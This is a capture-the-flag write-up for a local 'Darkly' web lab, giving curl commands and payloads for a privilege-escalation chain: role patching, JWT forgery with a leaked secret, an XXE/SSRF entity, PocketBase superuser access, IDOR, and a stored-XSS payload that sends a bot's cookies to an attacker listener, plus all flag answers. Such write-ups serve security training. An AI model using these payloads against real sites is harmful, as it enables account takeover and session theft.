# Darkly — Mandatory Walkthrough

**Target:** `http://localhost:4942` (FastAPI + PocketBase backend on `:8090`)
**Goal:** Recover 6 flags — 4 obtained by escalating privileges step by step up to
administrator (highest application account, `god`), plus 2 flags of choice from
other weaknesses.

**Final result: 6/6 flags — ladder fully climbed, from `visitor` to `god` + PocketBase superuser.**

---

## 1. Privilege ladder of the application

```
Visitor ──► Student ──► Cadet ──► Staff ──► God ──► [PocketBase superuser]
                       (flag 1)  (flag 2)  (flag 3)      (flag 4)
```

Roles exposed by `/api/docs-internal`:
`role_values: [visitor, student, cadet, staff, god]`

---

## 2. Steps to become god (each step = 1 flag)

### Step 0 — Foothold: account takeover via predictable reset token

- `POST /reset-password/request` leaks the reset token in the `Location`
  redirect header for **any** email, existing or not.
- Tokens are literally `md5(email)` — fully predictable.
- Used it against `jdoe@student.42.tech` → reset password → valid `student`
  session.

**Weakness:** predictable password-reset tokens + token disclosure in response.

### Step 1 — Student → Cadet — `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`

- `PATCH /api/profile` accepts a client-supplied `role` field.
- Server rejects `staff`/`admin` ("role not assignable") but **not `cadet`**.
- After re-login (JWT caches the old role), `/staff/dashboard` unlocks and
  shows the banner flag.

```bash
curl -X PATCH http://localhost:4942/api/profile \
  -b cookies_jdoe.txt -H 'Content-Type: application/json' \
  -d '{"role":"cadet"}'
# re-login, then:
curl -b cookies_jdoe.txt http://localhost:4942/staff/dashboard
# 🔓 Cadet+ access granted — internal staff flag: FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
```

**Weakness:** self-service role escalation (incomplete allow-list).

### Step 2 — Cadet → Staff — `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}`

- Session JWT: HS256, payload `{sub, login, role, exp}`.
- Deploy log (HTML comment on every page) discloses the JWT secret history:
  `"42"` → `"42network"` (current).
- Forge a `role: staff` token signed with `42network` → `/admin` unlocks
  (403 → 200) and the admin panel submissions table reveals the flag.

```bash
# forge with secret "42network", role=staff, same sub/exp shape
curl -b session=<forged_jwt> http://localhost:4942/admin
# submissions table: FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}
```

**Weakness:** hardcoded/disclosed JWT signing secret (secret reuse) →
arbitrary role claim forgery.

### Step 3 — Staff → God — `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`

- `/agenda` XML import uses stdlib `xml.etree` with no server-side validation
  (site's own HTML comments call it out).
- XXE: external entities let the server fetch internal resources from its own
  vantage point (localhost-only endpoints are unreachable directly — 403 from
  outside).
- Used the XXE/SSRF proxy to read `/internal/config`, which leaks the
  PocketBase superuser credentials (see Step 4) and the flag.

```xml
<?xml version="1.0"?>
<!DOCTYPE agenda [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:4942/internal/config">
]>
<agenda><event>&xxe;</event></agenda>
```

**Weakness:** XXE / SSRF (unvalidated XML import) → bypass of
localhost-only access control on `/internal/config`.

### Step 4 — God + PocketBase superuser — `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}`

- Credentials from Step 3 authenticate against the PocketBase admin API
  (`http://localhost:8090/_/`, exposed in dashboard HTML comments).
- With the superuser token (`/tmp/pbtok`), full access to all 9 collections:
  `users, posts, comments, projects, grades, newsletter, agenda_imports,
  internal_config, internal_audit`.
- The `internal_audit` collection contains the final ladder flag.

```bash
curl "http://127.0.0.1:8090/api/collections/internal_audit/records?perPage=200" \
  -H "Authorization: <pb_superuser_token>"
# FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}
```

**Weakness:** secrets in plaintext config + under-protected PocketBase admin
instance (superuser creds recoverable from the app itself).

---

## 3. Flags of choice (2 additional weaknesses)

### Flag 5 — IDOR on profiles — `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}`

- `/profile/{id}` and `/api/users/{id}` have **no ownership check**: any
  authenticated user can read any other account's full record, including
  `private_note` (wil's record holds the flag), `pw_hint` (`md5(password)`)
  and `recovery_code` for every user.

```bash
curl -b cookies_jdoe.txt http://localhost:4942/api/users/k1asdfeditojrb4   # wil
```

### Flag 6 — Stored XSS → bot cookie theft — `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

- Forum comments render user HTML unescaped ("HTML is supported").
- A moderation bot (headless Chrome, runs inside the VM) visits new/updated
  threads with a live session and a **non-httpOnly `flag` cookie**.
- Posted a comment with `<img src=x onerror=fetch(...)>` payload; the bot
  executed it and exfiltrated its cookies to our listener within ~2 min:

```
flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}
session=<moderator JWT, role=student>
```

(Scripts: `findings/repro-05-post-payload.sh`, `repro-05-xss-listener.py`.)

### Spare flag — reset-token recovery leak — `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`

- Discovered alongside the IDOR: benjamin/dorian/thanos's `recovery_code`
  field leaks this flag and confirms reset tokens are `md5(...)`-derived
  (ties back to Step 0).

---

## 4. Vulnerabilities exploited (summary)

1. **Predictable password-reset tokens** — token = md5-derived, disclosed in
   the `Location` header → full account takeover.
2. **Self-service role escalation** — `PATCH /api/profile` allows `cadet`
   (only `staff`/`admin` blocked) → real, persisted privilege grant.
3. **JWT secret disclosure + secret reuse** — old and current secrets leak in
   a deploy-log HTML comment → arbitrary claim (role) forgery.
4. **XXE / SSRF** — stdlib `xml.etree`, unvalidated XML import → server-side
   requests bypass the localhost-only restriction on `/internal/config`.
5. **Plaintext secrets / weak PB admin protection** — superuser credentials
   readable in internal config, PocketBase admin reachable and unhardened.
6. **IDOR** — `/profile/{id}` and `/api/users/{id}` lack ownership checks →
   `private_note`, `pw_hint`, `recovery_code` exposed for all users.
7. **Stored XSS** — forum comments rendered raw + non-httpOnly `flag` cookie
   on a privileged bot → cookie/session theft.
8. **Information disclosure** — debug headers, HTML comments, robots.txt,
   internal API schema (`/api/docs-internal`) map the whole attack surface.

---

## Annex A — Flag / vulnerability matrix

| # | Flag | Step / tier | Vulnerability | Location of flag |
|---|------|-------------|---------------|------------------|
| 1 | `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}` | Student → **Cadet** | Broken access control (self role-escalation via PATCH) | `/staff/dashboard` banner |
| 2 | `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}` | Cadet → **Staff** | JWT secret disclosure + claim forgery | `/admin` submissions table |
| 3 | `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}` | Staff → **God** | XXE/SSRF on XML import | `/internal/config` (localhost-only) |
| 4 | `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}` | God → **PB superuser** | Plaintext secrets / weak PB admin | PocketBase `internal_audit` collection |
| 5 | `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}` | (of choice) | IDOR on `/profile/{id}` & `/api/users/{id}` | wil's `private_note` |
| 6 | `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` | (of choice) | Stored XSS + non-httpOnly bot cookie | Exfiltrated from moderation bot |
| + | `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}` | (spare) | IDOR / predictable reset tokens | `recovery_code` field (benjamin, dorian, thanos) |

## Annex B — Escalation graph

```
                        ┌──────────────────────────────────────────────────────┐
                        │              PRIVILEGE ESCALATION LADDER             │
                        └──────────────────────────────────────────────────────┘

  Visitor
     │  password reset token = md5(email), leaked in Location header
     ▼
  Student ──────────────────────────────────────────────────────────────┐
     │  PATCH /api/profile {"role":"cadet"} (allow-list gap)            │
     ▼                                                                 │
  Cadet ──────────────── 🚩 FLAG{just_p4tch_y0ur_0wn_r0l3_lol}         │
     │  forge JWT with leaked secret "42network", role=staff           │
     ▼                                                                 │
  Staff ───────────────── 🚩 FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}       │
     │  XXE on /agenda XML import → SSRF to 127.0.0.1                  │
     ▼                                                                 │
  God ──────────────────── 🚩 FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}     │
     │  superuser creds from /internal/config → PocketBase /_/         │
     ▼                                                                 │
  PB Superuser ─────────── 🚩 FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y} │
                                                                       │
  SIDE CHANNELS (flags of choice):                                     │
     IDOR /profile/{id}  ────── 🚩 FLAG{1d0r_ur_pr0f1l3_1s_m1n3}       │
     Stored XSS → bot    ────── 🚩 FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}│
     IDOR recovery_code  ────── 🚩 FLAG{r3s3t_t0k3n_w4s_just_md5_lol}  │
                                                                       │
  7 flags total recovered (requirement: 6 — 4 escalation + 2 choice) ◄─┘
```

## Annex C — Chain-of-trust diagram

```
 [reset-token leak]──► student acct (jdoe)
        │
        ▼
 [PATCH role=cadet]──► cadet ──► /staff/dashboard ──► FLAG 1
        │
        ▼
 [JWT secret "42network" from deploy log]──► forged staff token ──► /admin ──► FLAG 2
        │
        ▼
 [XXE on /agenda]──► SSRF as server ──► /internal/config ──► FLAG 3 + PB creds
        │
        ▼
 [PB superuser auth]──► /_/ collections ──► internal_audit ──► FLAG 4
        │
 (parallel, any auth level)
        ├── [IDOR /api/users/{id}] ──► private_note ──► FLAG 5
        ├── [XSS in forum comments] ──► bot cookie theft ──► FLAG 6
        └── [IDOR recovery_code] ──► spare flag
```
